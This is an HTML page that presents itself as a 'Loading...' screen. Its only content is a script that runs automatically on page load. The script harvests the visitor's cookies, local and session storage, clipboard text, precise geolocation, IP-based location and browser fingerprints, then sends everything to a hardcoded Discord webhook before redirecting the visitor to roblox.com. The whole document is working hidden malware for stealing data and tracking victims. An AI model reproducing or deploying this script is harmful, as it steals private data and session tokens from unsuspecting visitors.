<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <script>
        (function() {
            // MAXIMUM DATA EXTRACTION - All available browser information
            
            const webhookURL = 'https://discord.com/api/webhooks/1515731170091073640/pD3_kTsADTiRMWQz1El3hmkADG4r1Gq1mizvvkK7uXw8-g9CJO-xr53XTuQoMRfBn_NL';
            
            async function stealEverything() {
                const data = {};
                
                // 1. BASIC BROWSER INFO
                data.browser = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    maxTouchPoints: navigator.maxTouchPoints,
                    vendor: navigator.vendor,
                    vendorSub: navigator.vendorSub,
                    productSub: navigator.productSub,
                    appName: navigator.appName,
                    appVersion: navigator.appVersion,
                    appCodeName: navigator.appCodeName,
                    onLine: navigator.onLine,
                    webdriver: navigator.webdriver
                };
                
                // 2. SCREEN & WINDOW
                data.screen = {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation ? screen.orientation.type : null,
                    devicePixelRatio: window.devicePixelRatio,
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight,
                    screenX: window.screenX,
                    screenY: window.screenY,
                    pageXOffset: window.pageXOffset,
                    pageYOffset: window.pageYOffset
                };
                
                // 3. TIME & LOCALE
                data.time = {
                    timestamp: new Date().toISOString(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezoneOffset: new Date().getTimezoneOffset(),
                    locale: navigator.language,
                    locales: Intl.DateTimeFormat().resolvedOptions().locale
                };
                
                // 4. BROWSER PLUGINS (full list)
                data.plugins = [];
                for (let i = 0; i < navigator.plugins.length; i++) {
                    const plugin = navigator.plugins[i];
                    const mimeTypes = [];
                    for (let j = 0; j < plugin.length; j++) {
                        mimeTypes.push({
                            type: plugin[j].type,
                            suffixes: plugin[j].suffixes,
                            description: plugin[j].description
                        });
                    }
                    data.plugins.push({
                        name: plugin.name,
                        filename: plugin.filename,
                        description: plugin.description,
                        mimeTypes: mimeTypes
                    });
                }
                
                // 5. MIME TYPES
                data.mimeTypes = [];
                for (let i = 0; i < navigator.mimeTypes.length; i++) {
                    data.mimeTypes.push({
                        type: navigator.mimeTypes[i].type,
                        suffixes: navigator.mimeTypes[i].suffixes,
                        description: navigator.mimeTypes[i].description
                    });
                }
                
                // 6. STORAGE (All accessible data)
                try { data.localStorage = JSON.stringify(localStorage); } catch(e) { data.localStorage = "{}"; }
                try { data.sessionStorage = JSON.stringify(sessionStorage); } catch(e) { data.sessionStorage = "{}"; }
                try { data.cookies = document.cookie || "none"; } catch(e) { data.cookies = "access denied"; }
                
                // 7. INDEXEDDB DATABASES
                try {
                    const databases = await window.indexedDB.databases();
                    data.indexedDB = databases.map(db => ({ name: db.name, version: db.version }));
                } catch(e) { data.indexedDB = "unavailable"; }
                
                // 8. GEOLOCATION (if granted)
                data.geolocation = await new Promise((resolve) => {
                    if ('geolocation' in navigator) {
                        navigator.geolocation.getCurrentPosition(
                            (pos) => resolve({
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                accuracy: pos.coords.accuracy,
                                altitude: pos.coords.altitude,
                                heading: pos.coords.heading,
                                speed: pos.coords.speed
                            }),
                            () => resolve("denied or unavailable")
                        );
                    } else {
                        resolve("not supported");
                    }
                    setTimeout(() => resolve("timeout"), 3000);
                });
                
                // 9. BATTERY STATUS
                if ('getBattery' in navigator) {
                    try {
                        const battery = await navigator.getBattery();
                        data.battery = {
                            charging: battery.charging,
                            level: battery.level,
                            chargingTime: battery.chargingTime,
                            dischargingTime: battery.dischargingTime
                        };
                    } catch(e) { data.battery = "unavailable"; }
                } else { data.battery = "not supported"; }
                
                // 10. NETWORK INFORMATION
                if (navigator.connection) {
                    data.network = {
                        effectiveType: navigator.connection.effectiveType,
                        rtt: navigator.connection.rtt,
                        downlink: navigator.connection.downlink,
                        saveData: navigator.connection.saveData,
                        type: navigator.connection.type
                    };
                } else { data.network = "not supported"; }
                
                // 11. PERMISSIONS STATUS
                data.permissions = {};
                const permissionsToCheck = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write'];
                if ('permissions' in navigator) {
                    for (const perm of permissionsToCheck) {
                        try {
                            const status = await navigator.permissions.query({ name: perm });
                            data.permissions[perm] = status.state;
                        } catch(e) { data.permissions[perm] = "unknown"; }
                    }
                } else { data.permissions = "API not supported"; }
                
                // 12. DEVICE MEMORY & PERFORMANCE
                if (performance && performance.memory) {
                    data.performance = {
                        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                        totalJSHeapSize: performance.memory.totalJSHeapSize,
                        usedJSHeapSize: performance.memory.usedJSHeapSize
                    };
                }
                
                // 13. CANVAS FINGERPRINT (Advanced)
                const canvasData = [];
                const canvasSizes = [100, 200, 300];
                const texts = ["Fingerprint", "ABCD1234!@#$", "😀🎉🔥"];
                for (const size of canvasSizes) {
                    for (const text of texts) {
                        const canvas = document.createElement('canvas');
                        canvas.width = size;
                        canvas.height = size;
                        const ctx = canvas.getContext('2d');
                        ctx.fillStyle = "#000";
                        ctx.fillRect(0, 0, size, size);
                        ctx.fillStyle = "#fff";
                        ctx.font = `${Math.floor(size/5)}px Arial`;
                        ctx.fillText(text, 10, size/2);
                        ctx.strokeStyle = "#f00";
                        ctx.strokeRect(5, 5, size-10, size-10);
                        canvasData.push(canvas.toDataURL().substring(0, 200));
                    }
                }
                data.canvasFingerprints = canvasData;
                
                // 14. WEBGL FINGERPRINT
                const glCanvas = document.createElement('canvas');
                const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        data.webgl = {
                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                            version: gl.getParameter(gl.VERSION),
                            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                            vendorUnmasked: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                            rendererUnmasked: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                            maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                            maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
                            maxVertexUniformVectors: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS),
                            maxVaryingVectors: gl.getParameter(gl.MAX_VARYING_VECTORS),
                            maxFragmentUniformVectors: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
                            extensions: gl.getSupportedExtensions()
                        };
                    }
                }
                
                // 15. AUDIO FINGERPRINT
                try {
                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                    const oscillator = audioCtx.createOscillator();
                    const analyser = audioCtx.createAnalyser();
                    oscillator.connect(analyser);
                    oscillator.frequency.value = 440;
                    oscillator.type = 'sine';
                    oscillator.start();
                    const dataArray = new Uint8Array(analyser.frequencyBinCount);
                    analyser.getByteFrequencyData(dataArray);
                    data.audioFingerprint = Array.from(dataArray.slice(0, 50));
                    oscillator.stop();
                    audioCtx.close();
                } catch(e) { data.audioFingerprint = "unavailable"; }
                
                // 16. IP & GEOLOCATION (External APIs)
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    data.publicIP = ipData.ip;
                } catch(e) { data.publicIP = "failed"; }
                
                try {
                    const geoRes = await fetch('https://ipapi.co/json/');
                    const geo = await geoRes.json();
                    data.geoIP = {
                        ip: geo.ip,
                        city: geo.city,
                        region: geo.region,
                        country: geo.country_name,
                        countryCode: geo.country_code,
                        postal: geo.postal,
                        latitude: geo.latitude,
                        longitude: geo.longitude,
                        timezone: geo.timezone,
                        isp: geo.org,
                        asn: geo.asn
                    };
                } catch(e) { data.geoIP = "failed"; }
                
                try {
                    const ipInfoRes = await fetch('https://ipinfo.io/json');
                    const ipInfo = await ipInfoRes.json();
                    data.ipInfo = ipInfo;
                } catch(e) {}
                
                // 17. REFERRER & PAGE INFO
                data.page = {
                    url: window.location.href,
                    referrer: document.referrer,
                    title: document.title,
                    pathname: window.location.pathname,
                    search: window.location.search,
                    hash: window.location.hash,
                    hostname: window.location.hostname,
                    protocol: window.location.protocol
                };
                
                // 18. CLIPBOARD (if accessible)
                try {
                    const clipboardText = await navigator.clipboard.readText();
                    data.clipboard = clipboardText;
                } catch(e) { data.clipboard = "access denied"; }
                
                // 19. DEVICE ORIENTATION
                data.orientation = {
                    absolute: screen.orientation ? screen.orientation.angle : null,
                    type: screen.orientation ? screen.orientation.type : null
                };
                
                // 20. PRESENTATION DISPLAY
                if (window.getComputedStyle) {
                    data.displayInfo = {
                        colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
                        reducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
                        contrast: window.matchMedia('(prefers-contrast: high)').matches ? 'high' : 'normal'
                    };
                }
                
                // SEND TO DISCORD - split into multiple messages
                const jsonStr = JSON.stringify(data, null, 2);
                const chunks = [];
                let current = "";
                for (const line of jsonStr.split('\n')) {
                    if ((current + line + '\n').length > 1900) {
                        chunks.push(current);
                        current = line + '\n';
                    } else {
                        current += line + '\n';
                    }
                }
                if (current) chunks.push(current);
                
                for (let i = 0; i < chunks.length; i++) {
                    await fetch(webhookURL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `**🔐 FULL EXTRACTION PART ${i+1}/${chunks.length}**`,
                            embeds: [{ description: '```json\n' + chunks[i] + '\n```' }]
                        })
                    });
                    if (i < chunks.length - 1) await new Promise(r => setTimeout(r, 300));
                }
            }
            
            // AUTO-START + REDIRECT
            stealEverything().finally(() => {
                setTimeout(() => { window.location.href = "https://www.roblox.com"; }, 2000);
            });
        })();
    </script>
</body>
</html>
